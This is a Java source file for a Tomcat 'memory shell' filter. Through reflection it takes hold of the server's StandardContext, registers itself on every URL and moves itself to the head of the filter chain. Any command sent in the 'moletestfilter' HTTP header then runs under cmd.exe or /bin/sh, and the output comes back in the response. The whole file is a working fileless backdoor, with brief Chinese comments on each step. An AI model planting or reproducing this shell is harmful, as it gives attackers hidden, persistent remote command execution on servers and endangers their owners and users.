import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.jni.Proc;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;

public class FilterMemShell implements Filter {

    public FilterMemShell() {
        try {
            ServletRequestAttributes attr = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
            ServletContext servletContext = attr.getRequest().getServletContext();
            ApplicationContextFacade appCtxFacade = (ApplicationContextFacade) servletContext;
            Field appCtxField = ApplicationContextFacade.class.getDeclaredField("context");
            appCtxField.setAccessible(true);
            ApplicationContext appCtx = (ApplicationContext) appCtxField.get(appCtxFacade);
            Field stdCtxField = ApplicationContext.class.getDeclaredField("context");
            stdCtxField.setAccessible(true);
            StandardContext stdCtx = (StandardContext) stdCtxField.get(appCtx);

            //1.添加filterDef
            FilterMemShell filterMemShell = new FilterMemShell("abc");
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterClass("FilterMemShell");
            filterDef.setFilterName(filterMemShell.getClass().getName());
            filterDef.setFilter(filterMemShell);
            stdCtx.addFilterDef(filterDef);
            //根据filterDefs重新生成filterConfig
            stdCtx.filterStart();
            //2.添加filterMap
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(filterMemShell.getClass().getName());
            filterMap.setDispatcher("REQUEST");
            filterMap.addURLPattern("/*");
            stdCtx.addFilterMap(filterMap);
            //3.将自定义filter移动到filterMaps数组的第0位置
            //  [这步非必要，只是为了提高FilterChain的处理顺序]
            FilterMap[] filterMaps = stdCtx.findFilterMaps();
            FilterMap[] tmpFilterMaps = new FilterMap[filterMaps.length];
            int idx = 1;
            for (int i = 0; i < filterMaps.length; i++) {
                FilterMap tmpFilter = filterMaps[i];
                if (tmpFilter.getFilterName().equalsIgnoreCase(filterMemShell.getClass().getName())) {
                    tmpFilterMaps[0] = tmpFilter;
                } else {
                    tmpFilterMaps[idx++] = tmpFilter;
                }
            }
            for (int i = 0; i < filterMaps.length; i++) {
                filterMaps[i] = tmpFilterMaps[i];
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public FilterMemShell(String anyStr) {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        String scode = ((HttpServletRequest)request).getHeader("moletestfilter");
        if (scode != null && !"".equals(scode.trim())) {
            try {
                PrintWriter writer = response.getWriter();
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", scode});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", scode});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();

                //直接return后，就不再继续走到下一个Filter以及接口实现了
                return;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        filterChain.doFilter(request, response);
    }
}
